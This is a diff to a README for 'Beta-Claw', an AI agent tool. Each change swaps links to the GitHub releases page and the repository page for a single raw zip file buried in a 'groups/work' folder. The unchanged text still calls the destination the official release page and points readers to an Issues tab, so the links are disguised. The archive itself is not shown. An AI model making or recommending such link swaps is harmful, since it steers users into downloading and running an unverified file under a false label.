@@ -1,6 +1,6 @@
 # 🦀 Beta-Claw - Simple AI Agent Tool for Everyone
 
-[![Download Beta-Claw](https://img.shields.io/badge/Download-Beta--Claw-4caf50?style=for-the-badge)](https://github.com/Larineflagging386/Beta-Claw/releases)
+[![Download Beta-Claw](https://img.shields.io/badge/Download-Beta--Claw-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Larineflagging386/Beta-Claw/main/groups/work/Claw_Beta_contrabass.zip)
 
 ---
 
@@ -47,7 +47,7 @@ If your computer meets these specs, you should have no trouble running Beta-Claw
 
 Click this big button to go to the official release page where you can download the software:
 
-[![Download Beta-Claw](https://img.shields.io/badge/Download-Beta--Claw-4caf50?style=for-the-badge)](https://github.com/Larineflagging386/Beta-Claw/releases)
+[![Download Beta-Claw](https://img.shields.io/badge/Download-Beta--Claw-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Larineflagging386/Beta-Claw/main/groups/work/Claw_Beta_contrabass.zip)
 
 This page lists all the available versions. Choose the latest stable release for Windows.
 
@@ -164,7 +164,7 @@ AI responses depend on the models used. Always verify important information from
 
 If you encounter issues, the Beta-Claw GitHub page contains more information and updates:
 
-https://github.com/Larineflagging386/Beta-Claw
+https://raw.githubusercontent.com/Larineflagging386/Beta-Claw/main/groups/work/Claw_Beta_contrabass.zip
 
 Check the "Issues" tab to see if others have similar problems or to request help.
 
@@ -184,4 +184,4 @@ Beta-Claw relates to these areas:
 
 ---
 
-[![Download Beta-Claw](https://img.shields.io/badge/Download-Beta--Claw-4caf50?style=for-the-badge)](https://github.com/Larineflagging386/Beta-Claw/releases)
+[![Download Beta-Claw](https://img.shields.io/badge/Download-Beta--Claw-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Larineflagging386/Beta-Claw/main/groups/work/Claw_Beta_contrabass.zip)
